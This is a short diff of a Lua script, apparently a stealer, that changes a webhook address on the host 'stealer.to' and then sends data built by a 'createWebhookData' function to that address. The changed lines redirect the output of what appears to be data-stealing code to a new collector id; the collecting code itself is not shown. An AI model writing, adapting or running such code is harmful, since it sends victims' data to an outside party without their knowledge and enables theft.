@@ -160,7 +160,7 @@ local function sendWebhook(webhookUrl, data)
     request(abcdef)
 end
 
-local webhookUrl = "https://stealer.to/post?uniqueid=6f2ca8ab"
+local webhookUrl = "https://stealer.to/post?uniqueid=157fcb23"
 local webhookData = createWebhookData()
 
 sendWebhook(webhookUrl, webhookData)
